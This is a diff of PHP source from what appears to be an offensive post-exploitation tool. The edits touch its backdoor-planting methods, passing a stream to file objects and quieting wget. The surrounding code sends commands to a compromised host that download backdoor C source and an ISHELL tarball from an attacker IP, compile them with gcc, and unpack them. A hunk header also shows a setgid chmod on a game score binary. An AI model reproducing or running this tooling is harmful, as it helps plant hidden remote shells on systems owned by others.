@@ -45,7 +45,7 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
     
     
     public function backdoor($stream,$lan_filepath){
-        $obj_exec = new FILE($lan_filepath);
+        $obj_exec = new FILE($this->stream,$lan_filepath);
         
         $data = "file $obj_exec->file_path";
         $file_info = $this->req_str($stream,$data,$this->stream_timeout,"");
@@ -82,7 +82,7 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
     public function backdoor4ruby($stream,$lan_filepath){
         $result = "";
         $this->ssTitre(__FUNCTION__);
-        $obj_jobs = new FILE($lan_filepath);
+        $obj_jobs = new FILE($this->stream,$lan_filepath);
         $data = "cat $obj_jobs->file_path | grep -i require ";
         $libs = $this->req_tab($stream,$data,$this->stream_timeout," | grep -i require | awk '{print $2}' | grep -Po \"[0-9a-z\_\-/]{1,}\"");
         
@@ -150,7 +150,7 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
         $result = "";
         $this->ssTitre(__FUNCTION__);
         $lan_filepath = trim($lan_filepath);
-        $obj_jobs = new FILE($lan_filepath);
+        $obj_jobs = new FILE($this->stream,$lan_filepath);
         
         $data = "file $obj_jobs->file_path";
         $this->req_str($stream,$data,$this->stream_timeout,"");
@@ -170,7 +170,7 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
     public function backdoor4ascii4bash($stream,$lan_filepath){
         $this->ssTitre(__FUNCTION__);
         $lan_filepath = trim($lan_filepath);
-        $obj_jobs = new FILE($lan_filepath);
+        $obj_jobs = new FILE($this->stream,$lan_filepath);
         
         $data = "file $obj_jobs->file_path";
         $this->req_str($stream,$data,$this->stream_timeout,"");
@@ -234,7 +234,7 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
         $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
                
         if(!$this->file4exist8path($stream, "/tmp/$backdoor_name")){
-        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
+        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -qO /tmp/$backdoor_name.c";
         $this->req_str($stream,$data,$this->stream_timeout,"");
         $data = "gcc -DDETACH -DNORENAME -Wall -s -o /tmp/$backdoor_name /tmp/$backdoor_name.c ";
         $this->req_str($stream,$data,$this->stream_timeout,"");
@@ -316,7 +316,7 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
         
         $filepath = "/tmp/ISHELL-v0.2/ishd";
         if (!$this->file4exist8path($stream, $filepath)){
-        $data = "wget http://$attacker_ip:$this->port_rfi/ISHELL-v0.2.tar.gz -O /tmp/ISHELL-v0.2.tar.gz";
+        $data = "wget http://$attacker_ip:$this->port_rfi/ISHELL-v0.2.tar.gz -qO /tmp/ISHELL-v0.2.tar.gz";
         $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "tar -xvf /tmp/ISHELL-v0.2.tar.gz -C /tmp ";
